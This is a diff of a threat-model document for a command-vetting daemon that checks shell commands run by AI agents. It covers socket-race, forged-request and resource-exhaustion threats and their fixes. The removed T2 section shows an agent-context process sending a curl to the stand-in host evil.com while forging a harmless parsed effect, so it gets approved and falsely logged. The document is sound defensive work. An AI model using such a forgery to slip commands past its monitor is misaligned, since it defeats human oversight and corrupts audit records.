@@ -22,26 +22,10 @@ bypass `vet`, not agents that impersonate `vetterd`).
 `vet` performs no peer-cred check on `connect()` (vet/src/wrap.rs:154)
 and the socket lives in a path the attacker can race for.
 
-**Fix**: move socket under `$XDG_RUNTIME_DIR` / `~/Library/Application
-Support/vetter/run/`; client calls `getpeereid()` / `SO_PEERCRED` on
+**Fix**: move socket under `$XDG_RUNTIME_DIR` / `~/Library/Application Support/vetter/run/`; client calls `getpeereid()` / `SO_PEERCRED` on
 the connected stream and aborts on UID mismatch; `vetterd` holds an
 `flock` on `<rundir>/vetterd.pid`, `vet` asserts the locking PID
 equals the peer PID.
-
-## T2 — Forged `parsed` bypasses the parser
-
-The daemon evaluates against `req.parsed`, not `req.argv`
-(vetterd/src/lib.rs:142). A same-UID process can submit
-`argv: ["curl", "https://evil.com"]` with
-`parsed.effects: [HttpRequest{ url: "https://example.com" }]`,
-get an `Allow`, and have the lie recorded verbatim in the audit log.
-Same-UID is exactly the agent context.
-
-**Fix**: drop `parsed` from `VetRequest` (or demote to a hint never
-used for policy); daemon re-runs `parsers::dispatch(&req.argv[0])
-.parse(&req.argv, …)` and policy runs against the daemon's parsed
-output. Stdin gets forwarded as bytes (≤ 1 MiB cap already in place).
-Wire break — bumps `PROTOCOL_VERSION` to 2.
 
 ## T3 — Resource exhaustion
 
@@ -67,16 +51,24 @@ unknown inodes (or matches against an expected install path list).
 
 ## Sequencing
 
-1. **PR 1 — path + peer-cred + deadlines.** Closes T1 (most of it)
-   and T3. `vetter-core/src/paths.rs` (new), `vetterd/src/{paths,
-   socket,lib}.rs`, `vet/src/wrap.rs`, `vetter-core/src/wire/mod.rs`
-   (`WireError::PeerAuth`).
-2. **PR 2 — daemon re-parse.** Closes T2. `vetter-core/src/wire/mod.rs`
-   (drop `parsed`, bump `PROTOCOL_VERSION`, forward stdin),
-   `vetterd/src/{lib,policy}.rs`.
-3. **PR 3 — PID attestation.** Closes the rest of T1.
-   `vetterd/src/lib.rs` (flock pid file), `vet/src/wrap.rs` (PID
-   attestation against the lock file).
+Remaining work, smallest blast radius first:
 
-T4 ships separately — small, orthogonal change in
-`vetter-core/src/parsers/mod.rs`.
+1. **PR — read deadlines + inflight cap.** Closes T3.
+  `vetterd/src/{lib,socket}.rs`.
+2. **PR — PID attestation.** Closes the rest of T1.
+  `vetterd/src/lib.rs` (flock pid file), `vet/src/wrap.rs` (PID
+   attestation against the lock file).
+3. **PR — argv0 inode resolution.** Closes T4. Small, orthogonal
+  change in `vetter-core/src/parsers/mod.rs`.
+
+Already shipped:
+
+- **T1 path + peer-cred** — socket moved out of `$TMPDIR`, parent dir
+forced to `0700`, `vet` runs `getpeereid()`/`SO_PEERCRED` on
+connect (PR #5).
+- **T2 daemon re-parse** — wire bumped to v2; `VetRequest` dropped
+`parsed`/`command`/`stdin_digest`; `vetterd::handle_connection`
+re-runs `parsers::dispatch(&argv[0]).parse(...)` and the matcher
+consumes the daemon's `ParsedCommand`. Forging `argv → effects` is
+no longer expressible on the wire.
+
